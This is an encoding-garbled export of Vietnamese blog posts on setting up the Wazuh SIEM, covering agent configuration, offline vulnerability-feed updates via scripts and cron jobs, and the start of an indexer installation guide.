\u0026lt;syscheck\u0026gt; \u0026lt;disabled\u0026gt;no\u0026lt;/disabled\u0026gt; \u0026lt;!-- Frequency that syscheck is executed default every 12 hours --\u0026gt; \u0026lt;frequency\u0026gt;43200\u0026lt;/frequency\u0026gt; \u0026lt;scan_on_start\u0026gt;yes\u0026lt;/scan_on_start\u0026gt; \u0026lt;!-- Directories to check (perform all possible verifications) --\u0026gt; \u0026lt;directories\u0026gt;/etc,/usr/bin,/usr/sbin\u0026lt;/directories\u0026gt; \u0026lt;directories\u0026gt;/bin,/sbin,/boot\u0026lt;/directories\u0026gt; \u0026lt;!-- Files/directories to ignore --\u0026gt; \u0026lt;ignore\u0026gt;/etc/mtab\u0026lt;/ignore\u0026gt; \u0026lt;ignore\u0026gt;/etc/hosts.deny\u0026lt;/ignore\u0026gt; \u0026lt;ignore\u0026gt;/etc/mail/statistics\u0026lt;/ignore\u0026gt; \u0026lt;ignore\u0026gt;/etc/random-seed\u0026lt;/ignore\u0026gt; \u0026lt;ignore\u0026gt;/etc/random.seed\u0026lt;/ignore\u0026gt; \u0026lt;ignore\u0026gt;/etc/adjtime\u0026lt;/ignore\u0026gt; \u0026lt;ignore\u0026gt;/etc/httpd/logs\u0026lt;/ignore\u0026gt; \u0026lt;ignore\u0026gt;/etc/utmpx\u0026lt;/ignore\u0026gt; \u0026lt;ignore\u0026gt;/etc/wtmpx\u0026lt;/ignore\u0026gt; \u0026lt;ignore\u0026gt;/etc/cups/certs\u0026lt;/ignore\u0026gt; \u0026lt;ignore\u0026gt;/etc/dumpdates\u0026lt;/ignore\u0026gt; \u0026lt;ignore\u0026gt;/etc/svc/volatile\u0026lt;/ignore\u0026gt; \u0026lt;!-- File types to ignore --\u0026gt; \u0026lt;ignore type=\u0026#34;sregex\u0026#34;\u0026gt;.log$|.swp$\u0026lt;/ignore\u0026gt; \u0026lt;!-- Check the file, but never compute the diff --\u0026gt; \u0026lt;nodiff\u0026gt;/etc/ssl/private.key\u0026lt;/nodiff\u0026gt; \u0026lt;skip_nfs\u0026gt;yes\u0026lt;/skip_nfs\u0026gt; \u0026lt;skip_dev\u0026gt;yes\u0026lt;/skip_dev\u0026gt; \u0026lt;skip_proc\u0026gt;yes\u0026lt;/skip_proc\u0026gt; \u0026lt;skip_sys\u0026gt;yes\u0026lt;/skip_sys\u0026gt; \u0026lt;!-- Nice value for Syscheck process --\u0026gt; \u0026lt;process_priority\u0026gt;10\u0026lt;/process_priority\u0026gt; \u0026lt;!-- Maximum output throughput --\u0026gt; \u0026lt;max_eps\u0026gt;100\u0026lt;/max_eps\u0026gt; \u0026lt;!-- Database synchronization settings --\u0026gt; \u0026lt;synchronization\u0026gt; \u0026lt;enabled\u0026gt;yes\u0026lt;/enabled\u0026gt; \u0026lt;interval\u0026gt;5m\u0026lt;/interval\u0026gt; \u0026lt;max_interval\u0026gt;1h\u0026lt;/max_interval\u0026gt; \u0026lt;max_eps\u0026gt;10\u0026lt;/max_eps\u0026gt; \u0026lt;/synchronization\u0026gt; \u0026lt;/syscheck\u0026gt; \u0026lt;!-- Log analysis --\u0026gt; \u0026lt;localfile\u0026gt; \u0026lt;log_format\u0026gt;command\u0026lt;/log_format\u0026gt; \u0026lt;command\u0026gt;df -P\u0026lt;/command\u0026gt; \u0026lt;frequency\u0026gt;360\u0026lt;/frequency\u0026gt; \u0026lt;/localfile\u0026gt; \u0026lt;localfile\u0026gt; \u0026lt;log_format\u0026gt;full_command\u0026lt;/log_format\u0026gt; \u0026lt;command\u0026gt;netstat -tulpn | sed \u0026#39;s/\\([[:alnum:]]\\+\\)\\ \\+[[:digit:]]\\+\\ \\+[[:digit:]]\\+\\ \\+\\(.*\\):\\([[:digit:]]*\\)\\ \\+\\([0-9\\.\\:\\*]\\+\\).\\+\\ \\([[:digit:]]*\\/[[:alnum:]\\-]*\\).*/\\1 \\2 == \\3 == \\4 \\5/\u0026#39; | sort -k 4 -g | sed \u0026#39;s/ == \\(.*\\) ==/:\\1/\u0026#39; | sed 1,2d\u0026lt;/command\u0026gt; \u0026lt;alias\u0026gt;netstat listening ports\u0026lt;/alias\u0026gt; \u0026lt;frequency\u0026gt;360\u0026lt;/frequency\u0026gt; \u0026lt;/localfile\u0026gt; \u0026lt;localfile\u0026gt; \u0026lt;log_format\u0026gt;full_command\u0026lt;/log_format\u0026gt; \u0026lt;command\u0026gt;last -n 20\u0026lt;/command\u0026gt; \u0026lt;frequency\u0026gt;360\u0026lt;/frequency\u0026gt; \u0026lt;/localfile\u0026gt; \u0026lt;!-- Active response --\u0026gt; \u0026lt;active-response\u0026gt; \u0026lt;disabled\u0026gt;no\u0026lt;/disabled\u0026gt; \u0026lt;ca_store\u0026gt;etc/wpk_root.pem\u0026lt;/ca_store\u0026gt; \u0026lt;ca_verification\u0026gt;yes\u0026lt;/ca_verification\u0026gt; \u0026lt;/active-response\u0026gt; \u0026lt;!-- Choose between \u0026#34;plain\u0026#34;, \u0026#34;json\u0026#34;, or \u0026#34;plain,json\u0026#34; for the format of internal logs --\u0026gt; \u0026lt;logging\u0026gt; \u0026lt;log_format\u0026gt;plain\u0026lt;/log_format\u0026gt; \u0026lt;/logging\u0026gt; \u0026lt;/ossec_config\u0026gt; \u0026lt;ossec_config\u0026gt; \u0026lt;localfile\u0026gt; \u0026lt;log_format\u0026gt;apache\u0026lt;/log_format\u0026gt; \u0026lt;location\u0026gt;/var/log/httpd/error_log\u0026lt;/location\u0026gt; \u0026lt;/localfile\u0026gt; \u0026lt;localfile\u0026gt; \u0026lt;log_format\u0026gt;apache\u0026lt;/log_format\u0026gt; \u0026lt;location\u0026gt;/var/log/httpd/access_log\u0026lt;/location\u0026gt; \u0026lt;/localfile\u0026gt; \u0026lt;localfile\u0026gt; \u0026lt;log_format\u0026gt;audit\u0026lt;/log_format\u0026gt; \u0026lt;location\u0026gt;/var/log/audit/audit.log\u0026lt;/location\u0026gt; \u0026lt;/localfile\u0026gt; \u0026lt;localfile\u0026gt; \u0026lt;log_format\u0026gt;syslog\u0026lt;/log_format\u0026gt; \u0026lt;location\u0026gt;/var/ossec/logs/active-responses.log\u0026lt;/location\u0026gt; \u0026lt;/localfile\u0026gt; \u0026lt;localfile\u0026gt; \u0026lt;log_format\u0026gt;syslog\u0026lt;/log_format\u0026gt; \u0026lt;location\u0026gt;/var/log/messages\u0026lt;/location\u0026gt; \u0026lt;/localfile\u0026gt; \u0026lt;localfile\u0026gt; \u0026lt;log_format\u0026gt;syslog\u0026lt;/log_format\u0026gt; \u0026lt;location\u0026gt;/var/log/secure\u0026lt;/location\u0026gt; \u0026lt;/localfile\u0026gt; \u0026lt;localfile\u0026gt; \u0026lt;log_format\u0026gt;syslog\u0026lt;/log_format\u0026gt; \u0026lt;location\u0026gt;/var/log/maillog\u0026lt;/location\u0026gt; \u0026lt;/localfile\u0026gt; \u0026lt;localfile\u0026gt; \u0026lt;log_format\u0026gt;json\u0026lt;/log_format\u0026gt; \u0026lt;location\u0026gt;/tmp/packetbeat/packetbeat\u0026lt;/location\u0026gt; \u0026lt;/localfile\u0026gt; \u0026lt;/ossec_config\u0026gt; \u0026lt;ossec_config\u0026gt; \u0026lt;localfile\u0026gt; \u0026lt;log_format\u0026gt;full_command\u0026lt;/log_format\u0026gt; \u0026lt;alias\u0026gt;process list\u0026lt;/alias\u0026gt; \u0026lt;command\u0026gt;ps -e -o pid,uname,command\u0026lt;/command\u0026gt; \u0026lt;frequency\u0026gt;30\u0026lt;/frequency\u0026gt; \u0026lt;/localfile\u0026gt; \u0026lt;/ossec_config\u0026gt; LÆ°u láº¡i file vÃ  khá»Ÿi Ä‘á»™ng láº¡i dá»‹ch vá»¥\nsystemctl restart wazuh-agent Chá» 1 lÃºc Ä‘á»ƒ há»‡ thá»‘ng táº¡o káº¿t ná»‘i vÃ  vÃ o Manager Ä‘á»ƒ kiá»ƒm tra láº¡i.\n","date":"13 May 2023","externalUrl":null,"permalink":"/soc/wazuh-agents-installation/","section":"SOC","summary":"","title":"CÃ i Ä‘áº·t vÃ  cáº¥u hÃ¬nh Wazuh-agents","type":"soc"},{"content":"Sau khi Ä‘Ã£ cÃ i Ä‘áº·t xong cÃ¡c thÃ nh pháº§n cÅ©ng nhÆ° cÃ i Ä‘áº·t nhá»¯ng Agent Ä‘áº§u tiÃªn trong há»‡ thá»‘ng Ä‘á»ƒ báº¯t Ä‘áº§u nháº­n log, tÃ´i nháº­n ra má»™t váº¥n Ä‘á» lÃ  Wazuh manager cá»§a tÃ´i khÃ´ng Ä‘Æ°a ra Ä‘Æ°á»£c cáº£nh báº£o, khÃ´ng phÃ¡t hiá»‡n Ä‘Æ°á»£c CVE hay Ä‘iá»ƒm yáº¿u nÃ o. Cháº¯c cháº¯n khÃ´ng pháº£i do mÃ¡y tÃ´i sáº¡ch, lÃ m gÃ¬ cÃ³ mÃ¡y nÃ o \u0026ldquo;sáº¡ch\u0026rdquo; hoÃ n toÃ n =)))\nSau má»™t lÃºc Ä‘á»c Doc cá»§a Wazuh vÃ  Ä‘á»‘i chiáº¿u vá»›i há»‡ thá»‘ng, tÃ´i nháº­n ra tÃ´i Ä‘Ã£ quÃªn máº¥t trong há»‡ thá»‘ng cá»§a mÃ¬nh cÃ³ web gateway, vÃ  viá»‡c cÃ¡c trang web bá»‹ cháº·n bá»Ÿi proxy lÃ  bÃ¬nh thÆ°á»ng. Váº­y nÃªn viá»‡c cá»§a tÃ´i bÃ¢y h lÃ  cáº§n pháº£i cáº¥u hÃ¬nh thá»§ cÃ´ng Ä‘á»ƒ wazuh tá»± Ä‘á»™ng cáº­p nháº­t má»—i khi cÃ³ lá»— há»•ng má»›i.\nQuy trÃ¬nh cá»§a viá»‡c nÃ y sáº½ lÃ  táº£i cÃ¡c file xml chá»©a thÃ´ng tin cá»§a cÃ¡c CVE tÆ°Æ¡ng á»©ng vá»›i cÃ¡c phiÃªn báº£n Agent vÃ  sau Ä‘Ã³ táº¡o 1 cron job Ä‘á»ƒ nÃ³ cháº¡y tá»± Ä‘á»™ng.\nBÃ i viáº¿t nÃ y dá»±a trÃªn pháº§n Offline-update cá»§a Wazuh documentation.\nDownloading the specific vulnerability files # Viá»‡c Ä‘áº§u tiÃªn lÃ  táº£i cÃ¡c file xml chá»©a lá»— há»•ng cho tá»«ng phiÃªn báº£n há»‡ Ä‘iá»u hÃ nh cá»§a Agent cÃ³ thá»ƒ xuáº¥t hiá»‡n trong mÃ´i trÆ°á»ng doanh nghiá»‡p cá»§a chÃºng ta.\nNhÆ° Ä‘Ã£ nÃ³i á»Ÿ trÃªn, do khÃ´ng thá»ƒ táº£i trá»±c tiáº¿p cÃ¡c file tá»« mÃ¡y chá»§ wazuh nÃªn tÃ´i sáº½ táº£i táº¥t cáº£ vá» mÃ¡y cÃ¡ nhÃ¢n vÃ  chuyá»ƒn nÃ³ vá» mÃ¡y chá»§ wazuh (cÃ³ thá»ƒ báº±ng ssh hoáº·c chá»©c nÄƒng truyá»n file trÃªn cÃ¡c pháº§n má»m ssh nhÆ°: Mobaxterm, Termius, \u0026hellip;)\nTrÆ°á»›c tiÃªn tÃ´i sáº½ táº¡o 1 thÆ° má»¥c Ä‘á»ƒ lÆ°u háº¿t cÃ¡c file sáº½ táº£i vá».\nmkdir /var/ossec/offline-update Linux OS # Táº£i xuá»‘ng cÃ¡c file cá»§a cÃ¡c phiÃªn báº£n Linux theo link bÃªn dÆ°á»›i.\nUbuntu # OS Files Trusty com.ubuntu.trusty.cve.oval.xml.bz2 Xenial com.ubuntu.xenial.cve.oval.xml.bz2 Bionic com.ubuntu.bionic.cve.oval.xml.bz2 Focal com.ubuntu.focal.cve.oval.xml.bz2 Jammy com.ubuntu.jammy.cve.oval.xml.bz2 Debian # OS Files Bullseye oval-definitions-bullseye.xml Buster oval-definitions-buster.xml Debian Security Tracker JSON feed # OS Files ALL Debian Security Tracker JSON Red Hat # OS Files 5 com.redhat.rhsa-RHEL5.xml.bz2 6 rhel-6-including-unpatched.oval.xml.bz2 7 rhel-7-including-unpatched.oval.xml.bz2 8 rhel-8-including-unpatched.oval.xml.bz2 9 rhel-9-including-unpatched.oval.xml.bz2 Windows OS # OS Files ALL msu-updates.json.gz Sau khi Ä‘Ã£ táº£i xong táº¥t cáº£ cÃ¡c file trÃªn, tÃ´i sáº½ pháº£i chuyá»ƒn nÃ³ vá» thÆ° má»¥c /offline-update/ mÃ  tÃ´i Ä‘Ã£ táº¡o tá»« ban Ä‘áº§u trÃªn mÃ¡y chá»§ wazuh.\nOffline update script # VÃ¬ lÃ  offile update nÃªn Wazuh sáº½ khÃ´ng tá»± Ä‘á»™ng cáº­p nháº­t cÃ¡c pack trÃªn má»—i khi cÃ³ CVE hay lá»— há»•ng má»›i. TÃ´i sáº½ sá»­ dá»¥ng script Ä‘á»ƒ nÃ³ update tá»± Ä‘á»™ng, vÃ  á»Ÿ Ä‘Ã¢y tÃ´i chá»n update tá»± Ä‘á»™ng sau má»—i 1h.\nRed Hat Security Data JSON feed # Wazuh cÃ³ cung cáº¥p 2 script Ä‘á»ƒ phá»¥c vá»¥ cho viá»‡c update thá»§ cÃ´ng. Script Ä‘áº§u tiá»n dÃ¹ng Ä‘á»ƒ update cÃ¡c CVE má»›i má»—i khi nÃ³ Ä‘Æ°á»£c cÃ´ng bá»‘, vÃ  Ä‘Æ°á»£c cáº­p nháº­t liÃªn tá»¥c tá»« nÄƒm 1999.\nÄáº§u tiá»n tÃ´i táº¡o 1 folder Ä‘á»ƒ lÆ°u cÃ¡c feeds\nmkdir /var/ossec/offline-update/rh-feed Táº£i script Ä‘Ã³ vá» vÃ  cháº¡y\n/var/ossec/offline-update/rh-generator.sh /var/ossec/offline-update/rh-feed Sau khi cháº¡y script Ä‘Ã£ cháº¡y xong, vÃ o láº¡i thÆ° má»¥c Ä‘á»ƒ kiá»ƒm tra\nroot@siem:~# ll /var/ossec/offline-update/rh-feed/ total 22312 drwxr-xr-x 2 root wazuh 4096 Jun 2 16:00 ./ drwxr-xr-x 4 root wazuh 4096 Apr 20 16:44 ../ -rw-r--r-- 1 root root 775209 Jun 2 16:00 redhat-feed10.json -rw-r--r-- 1 root root 956401 Jun 2 16:00 redhat-feed11.json -rw-r--r-- 1 root root 966884 Jun 2 16:00 redhat-feed12.json -rw-r--r-- 1 root root 730036 Jun 2 16:00 redhat-feed13.json -rw-r--r-- 1 root root 686898 Jun 2 16:00 redhat-feed14.json -rw-r--r-- 1 root root 880443 Jun 2 16:00 redhat-feed15.json -rw-r--r-- 1 root root 727703 Jun 2 16:00 redhat-feed16.json -rw-r--r-- 1 root root 752990 Jun 2 16:00 redhat-feed17.json -rw-r--r-- 1 root root 869173 Jun 2 16:00 redhat-feed18.json -rw-r--r-- 1 root root 946425 Jun 2 16:00 redhat-feed19.json -rw-r--r-- 1 root root 666265 Jun 2 16:00 redhat-feed1.json -rw-r--r-- 1 root root 991033 Jun 2 16:00 redhat-feed20.json -rw-r--r-- 1 root root 934536 Jun 2 16:00 redhat-feed21.json -rw-r--r-- 1 root root 814900 Jun 2 16:00 redhat-feed22.json -rw-r--r-- 1 root root 776735 Jun 2 16:00 redhat-feed23.json -rw-r--r-- 1 root root 572706 Jun 2 16:00 redhat-feed24.json -rw-r--r-- 1 root root 567478 Jun 2 16:00 redhat-feed25.json -rw-r--r-- 1 root root 518678 Jun 2 16:00 redhat-feed26.json -rw-r--r-- 1 root root 511669 Jun 2 16:00 redhat-feed27.json -rw-r--r-- 1 root root 399497 Jun 2 16:00 redhat-feed28.json -rw-r--r-- 1 root root 137052 Jun 2 16:00 redhat-feed29.json -rw-r--r-- 1 root root 1026736 Jun 2 16:00 redhat-feed2.json -rw-r--r-- 1 root root 898897 Jun 2 16:00 redhat-feed3.json -rw-r--r-- 1 root root 797044 Jun 2 16:00 redhat-feed4.json -rw-r--r-- 1 root root 803644 Jun 2 16:00 redhat-feed5.json -rw-r--r-- 1 root root 913641 Jun 2 16:00 redhat-feed6.json -rw-r--r-- 1 root root 1422008 Jun 2 16:00 redhat-feed7.json -rw-r--r-- 1 root root 853773 Jun 2 16:00 redhat-feed8.json -rw-r--r-- 1 root root 884240 Jun 2 16:00 redhat-feed9.json National Vulnerability Database # Script thá»© 2 dÃ¹ng Ä‘á»ƒ update thá»§ cÃ´ng cÆ¡ sá»Ÿ dá»¯ liá»‡u lá»— há»•ng NVD. TÃ´i cÅ©ng pháº£i táº¡o 1 thÆ° má»¥c Ä‘á»ƒ cáº­p nháº­t lá»— há»•ng cá»§a cÃ¡c nÄƒm cho Ä‘áº¿n thá»i Ä‘iá»ƒm hiá»‡n táº¡i.\nmkdir /var/ossec/offline-update/nvd-feed Äá»ƒ cháº¡y script nÃ y, tÃ´i cáº§n xÃ¡c Ä‘á»‹nh nÄƒm mÃ  tÃ´i muá»‘n láº¥y lá»— há»•ng. TÃ´i sáº½ láº¥y táº¥t cáº£ lá»— há»•ng vÃ  cáº­p nháº­t nÃ³ ká»ƒ tá»« nÄƒm 2002 Ä‘áº¿n nay\n/var/ossec/offline-update/nvd-generator.sh 2002 /var/ossec/offline-update/nvd-feed Sau khi cháº¡y script Ä‘Ã£ cháº¡y xong, vÃ o láº¡i thÆ° má»¥c Ä‘á»ƒ kiá»ƒm tra\nroot@siem:~# ll /var/ossec/offline-update/nvd-feed/ total 58420 drwxr-xr-x 2 root wazuh 4096 Jun 1 18:00 ./ drwxr-xr-x 4 root wazuh 4096 Apr 20 16:44 ../ -rw-r--r-- 1 root root 1460135 Jun 2 15:00 nvd-feed2002.json.gz -rw-r--r-- 1 root root 435532 Jun 2 15:00 nvd-feed2003.json.gz -rw-r--r-- 1 root root 97973 Jun 2 15:03 nvd-feed2004.json.gz -rw-r--r-- 1 root root 1345598 Jun 2 15:03 nvd-feed2005.json.gz -rw-r--r-- 1 root root 2131988 Jun 2 15:03 nvd-feed2006.json.gz -rw-r--r-- 1 root root 2108354 Jun 2 15:03 nvd-feed2007.json.gz -rw-r--r-- 1 root root 2160683 Jun 2 15:03 nvd-feed2008.json.gz -rw-r--r-- 1 root root 1965308 Jun 2 15:03 nvd-feed2009.json.gz -rw-r--r-- 1 root root 1925207 Jun 2 15:03 nvd-feed2010.json.gz -rw-r--r-- 1 root root 1813239 Jun 2 15:03 nvd-feed2011.json.gz -rw-r--r-- 1 root root 2021518 Jun 2 15:03 nvd-feed2012.json.gz -rw-r--r-- 1 root root 2415597 Jun 2 15:03 nvd-feed2013.json.gz -rw-r--r-- 1 root root 2345483 Jun 2 15:03 nvd-feed2014.json.gz -rw-r--r-- 1 root root 2239999 Jun 2 15:04 nvd-feed2015.json.gz -rw-r--r-- 1 root root 2701974 Jun 2 15:04 nvd-feed2016.json.gz -rw-r--r-- 1 root root 3832210 Jun 2 15:04 nvd-feed2017.json.gz -rw-r--r-- 1 root root 4138080 Jun 2 15:04 nvd-feed2018.json.gz -rw-r--r-- 1 root root 4706272 Jun 2 15:04 nvd-feed2019.json.gz -rw-r--r-- 1 root root 5726147 Jun 2 15:04 nvd-feed2020.json.gz -rw-r--r-- 1 root root 6358273 Jun 2 15:04 nvd-feed2021.json.gz -rw-r--r-- 1 root root 6028683 Jun 2 15:04 nvd-feed2022.json.gz -rw-r--r-- 1 root root 1819248 Jun 2 15:04 nvd-feed2023.json.gz Automate cronjob # TÃ´i sáº½ táº¡o 1 cronjob Ä‘á»ƒ sau má»—i giá», há»‡ thá»‘ng cÃ³ thá»ƒ tá»± cháº¡y 2 script vÃ  tá»± Ä‘á»™ng update.\nnano /etc/crontab ThÃªm 2 dÃ²ng bÃªn dÆ°á»›i vÃ o cuá»‘i file crontab\n0 * * * * root /var/ossec/offline-update/rh-generator.sh /var/ossec/offline-update/rh-feed/ 0 * * * * root /var/ossec/offline-update/nvd-generator.sh 2002 /var/ossec/offline-update/nvd-feed/ LÆ°u láº¡i file vÃ  khá»Ÿi Ä‘á»™ng láº¡i dá»‹ch vá»¥ cron\nsystemctl restart cron Offline update sample # Sau khi Ä‘Ã£ thá»±c hiá»‡n cÃ¡c bÆ°á»›c táº£i vÃ  Ä‘á»‹nh vá»‹ trÃ­ cho cÃ¡c file, tÃ´i sáº½ cáº¥u hÃ¬nh láº¡i Ä‘Æ°á»ng dáº«n trong file ossec.conf giá»‘ng nhÆ° bÃªn dÆ°á»›i\n\u0026lt;vulnerability-detector\u0026gt; \u0026lt;enabled\u0026gt;yes\u0026lt;/enabled\u0026gt; \u0026lt;interval\u0026gt;5m\u0026lt;/interval\u0026gt; \u0026lt;min_full_scan_interval\u0026gt;6h\u0026lt;/min_full_scan_interval\u0026gt; \u0026lt;run_on_start\u0026gt;yes\u0026lt;/run_on_start\u0026gt; \u0026lt;!-- Ubuntu OS vulnerabilities --\u0026gt; \u0026lt;provider name=\u0026#34;canonical\u0026#34;\u0026gt; \u0026lt;enabled\u0026gt;yes\u0026lt;/enabled\u0026gt; \u0026lt;os path=\u0026#34;/var/ossec/offline-update/com.ubuntu.trusty.cve.oval.xml.bz2\u0026#34;\u0026gt;trusty\u0026lt;/os\u0026gt; \u0026lt;os path=\u0026#34;/var/ossec/offline-update/com.ubuntu.xenial.cve.oval.xml.bz2\u0026#34;\u0026gt;xenial\u0026lt;/os\u0026gt; \u0026lt;os path=\u0026#34;/var/ossec/offline-update/com.ubuntu.bionic.cve.oval.xml.bz2\u0026#34;\u0026gt;bionic\u0026lt;/os\u0026gt; \u0026lt;os path=\u0026#34;/var/ossec/offline-update/com.ubuntu.focal.cve.oval.xml.bz2\u0026#34;\u0026gt;focal\u0026lt;/os\u0026gt; \u0026lt;os path=\u0026#34;/var/ossec/offline-update/com.ubuntu.jammy.cve.oval.xml.bz2\u0026#34;\u0026gt;jammy\u0026lt;/os\u0026gt; \u0026lt;update_interval\u0026gt;1h\u0026lt;/update_interval\u0026gt; \u0026lt;/provider\u0026gt; \u0026lt;!-- Debian OS vulnerabilities --\u0026gt; \u0026lt;provider name=\u0026#34;debian\u0026#34;\u0026gt; \u0026lt;enabled\u0026gt;yes\u0026lt;/enabled\u0026gt; \u0026lt;os path=\u0026#34;/var/ossec/offline-update/oval-definitions-buster.xml\u0026#34;\u0026gt;buster\u0026lt;/os\u0026gt; \u0026lt;os path=\u0026#34;/var/ossec/offline-update/oval-definitions-bullseye.xml\u0026#34;\u0026gt;bullseye\u0026lt;/os\u0026gt; \u0026lt;path\u0026gt;/var/ossec/offline-update/security_tracker_local.json\u0026lt;/path\u0026gt; \u0026lt;update_interval\u0026gt;1h\u0026lt;/update_interval\u0026gt; \u0026lt;/provider\u0026gt; \u0026lt;!-- RedHat OS vulnerabilities --\u0026gt; \u0026lt;provider name=\u0026#34;redhat\u0026#34;\u0026gt; \u0026lt;enabled\u0026gt;yes\u0026lt;/enabled\u0026gt; \u0026lt;os path=\u0026#34;/var/ossec/offline-update/com.redhat.rhsa-RHEL5.xml.bz2\u0026#34;\u0026gt;5\u0026lt;/os\u0026gt; \u0026lt;os path=\u0026#34;/var/ossec/offline-update/rhel-6-including-unpatched.oval.xml.bz2\u0026#34;\u0026gt;6\u0026lt;/os\u0026gt; \u0026lt;os path=\u0026#34;/var/ossec/offline-update/rhel-7-including-unpatched.oval.xml.bz2\u0026#34;\u0026gt;7\u0026lt;/os\u0026gt; \u0026lt;os path=\u0026#34;/var/ossec/offline-update/rhel-8-including-unpatched.oval.xml.bz2\u0026#34;\u0026gt;8\u0026lt;/os\u0026gt; \u0026lt;os path=\u0026#34;/var/ossec/offline-update/rhel-9-including-unpatched.oval.xml.bz2\u0026#34;\u0026gt;9\u0026lt;/os\u0026gt; \u0026lt;path\u0026gt;/var/ossec/offline-update/rh-feed/redhat-feed[[:digit:]]\\+\\.json$\u0026lt;/path\u0026gt; \u0026lt;update_interval\u0026gt;1h\u0026lt;/update_interval\u0026gt; \u0026lt;/provider\u0026gt; \u0026lt;!-- Amazon Linux OS vulnerabilities --\u0026gt; \u0026lt;provider name=\u0026#34;alas\u0026#34;\u0026gt; \u0026lt;enabled\u0026gt;no\u0026lt;/enabled\u0026gt; \u0026lt;os\u0026gt;amazon-linux\u0026lt;/os\u0026gt; \u0026lt;os\u0026gt;amazon-linux-2\u0026lt;/os\u0026gt; \u0026lt;update_interval\u0026gt;1h\u0026lt;/update_interval\u0026gt; \u0026lt;/provider\u0026gt; \u0026lt;!-- SUSE OS vulnerabilities --\u0026gt; \u0026lt;provider name=\u0026#34;suse\u0026#34;\u0026gt; \u0026lt;enabled\u0026gt;no\u0026lt;/enabled\u0026gt; \u0026lt;os\u0026gt;11-server\u0026lt;/os\u0026gt; \u0026lt;os\u0026gt;11-desktop\u0026lt;/os\u0026gt; \u0026lt;os\u0026gt;12-server\u0026lt;/os\u0026gt; \u0026lt;os\u0026gt;12-desktop\u0026lt;/os\u0026gt; \u0026lt;os\u0026gt;15-server\u0026lt;/os\u0026gt; \u0026lt;os\u0026gt;15-desktop\u0026lt;/os\u0026gt; \u0026lt;update_interval\u0026gt;1h\u0026lt;/update_interval\u0026gt; \u0026lt;/provider\u0026gt; \u0026lt;!-- Arch OS vulnerabilities --\u0026gt; \u0026lt;provider name=\u0026#34;arch\u0026#34;\u0026gt; \u0026lt;enabled\u0026gt;no\u0026lt;/enabled\u0026gt; \u0026lt;update_interval\u0026gt;1h\u0026lt;/update_interval\u0026gt; \u0026lt;/provider\u0026gt; \u0026lt;!-- Windows OS vulnerabilities --\u0026gt; \u0026lt;provider name=\u0026#34;msu\u0026#34;\u0026gt; \u0026lt;enabled\u0026gt;yes\u0026lt;/enabled\u0026gt; \u0026lt;path\u0026gt;/var/ossec/offline-update/msu-updates\\.json\\.gz$\u0026lt;/path\u0026gt; \u0026lt;update_interval\u0026gt;1h\u0026lt;/update_interval\u0026gt; \u0026lt;/provider\u0026gt; \u0026lt;!-- Aggregate vulnerabilities --\u0026gt; \u0026lt;provider name=\u0026#34;nvd\u0026#34;\u0026gt; \u0026lt;enabled\u0026gt;yes\u0026lt;/enabled\u0026gt; \u0026lt;path\u0026gt;/var/ossec/offline-update/nvd-feed/nvd-feed[[:digit:]]\\{4\\}\\.json\\.gz$\u0026lt;/path\u0026gt; \u0026lt;update_from_year\u0026gt;2010\u0026lt;/update_from_year\u0026gt; \u0026lt;update_interval\u0026gt;1h\u0026lt;/update_interval\u0026gt; \u0026lt;/provider\u0026gt; \u0026lt;/vulnerability-detector\u0026gt; Xem thÃªm vá» cáº¥u hÃ¬nh táº¡i Ä‘Ã¢y\n","date":"9 May 2023","externalUrl":null,"permalink":"/soc/wazuh-configuration/","section":"SOC","summary":"","title":"Cáº¥u hÃ¬nh Wazuh vulnerability detection","type":"soc"},{"content":"Do Ä‘áº·c thÃ¹ cÃ´ng viá»‡c nÃªn tá»« má»™t ngÆ°á»i lÃ m Pentest tÃ´i pháº£i chuyá»ƒn sang lÃ m SOC vÃ  Ä‘áº£m nhiá»‡m viá»‡c xÃ¢y dá»±ng há»‡ thá»‘ng SIEM. Máº·c dÃ¹ thá»i Ä‘iá»ƒm hiá»‡n táº¡i cÃ³ ráº¥t nhiá»u sáº£n pháº©m thÆ°Æ¡ng máº¡i Ä‘Ã£ hoÃ n thiá»‡n, chá»‰ chá» doanh nghiá»‡p mua vá» vÃ  váº­n hÃ nh thÃ´i. Tuy nhiÃªn chi phÃ­ cho cÃ¡c sáº£n pháº©m nÃ y lÃ  má»™t trá»Ÿ ngáº¡i Ä‘á»‘i vá»›i cÃ¡c doanh nghiá»‡p vá»«a vÃ  nhá» (nÃ³ Ä‘áº¯t \u0026#x1f606;).\nVáº­y nÃªn vá»«a Ä‘á»ƒ cÃ³ thÃªm kiáº¿n thá»©c vÃ  Ä‘á»ƒ tiáº¿t kiá»‡m chi phÃ­, tÃ´i sáº½ tá»± xÃ¢y dá»±ng há»‡ thá»‘ng SIEM dá»±a trÃªn open source. Má»™t trong nhá»¯ng open source máº¡nh máº½ nháº¥t (hoáº·c lÃ  do tÃ´i nghÄ© tháº¿) lÃ  WAZUH\nWazuh lÃ  má»™t ná»n táº£ng báº£o máº­t mÃ£ nguá»“n má»Ÿ vÃ  miá»…n phÃ­, há»£p nháº¥t cÃ¡c kháº£ nÄƒng cá»§a XDR vÃ  â€‹â€‹SIEM, khÃ´ng chá»‰ cho phÃ©p cÃ¡c cÃ´ng ty phÃ¡t hiá»‡n cÃ¡c má»‘i Ä‘e dá»a tinh vi mÃ  cÃ²n cÃ³ thá»ƒ giÃºp ngÄƒn ngá»«a vi pháº¡m vÃ  rÃ² rá»‰ dá»¯ liá»‡u xáº£y ra.\nHiá»‡n táº¡i thÃ¬ tÃ´i Ä‘ang triá»ƒn khai nÃ³ trÃªn mÃ´i trÆ°á»ng thá»±c táº¿, váº­y nÃªn cháº¯c cháº¯n lÃ  nÃ³ hoáº¡t Ä‘á»™ng.\nKiáº¿n trÃºc # Äá»c thÃªm vá» cáº¥u trÃºc táº¡i Ä‘Ã¢y hoáº·c lÃ  Ä‘Ã¢y\nHiá»‡n táº¡i thÃ¬ WAZUH Ä‘ang á»Ÿ phiÃªn báº£n 4.4 váº­y nÃªn táº¥t cáº£ cÃ i Ä‘áº·t vÃ  cáº¥u hÃ¬nh trong bÃ i nÃ y cÅ©ng sáº½ á»Ÿ phiÃªn báº£n 4.4, trong trÆ°á»ng há»£p cÃ³ cÃ¡c cáº­p nháº­t má»›i, chá»‰ cáº§n thay Ä‘á»•i tÃªn phiÃªn báº£n (náº¿u) xuáº¥t hiá»‡n trong cÃ¡c link cÃ i Ä‘áº·t.\nWAZUH INDEXER # Äá»ƒ khÃ´ng gáº·p cÃ¡c lá»—i trong quÃ¡ trÃ¬nh cÃ i Ä‘áº·t, pháº£i sá»­ dá»¥ng quyá»n root\nCertificates creation # Táº£i tool táº¡o cert vÃ  file config cá»§a 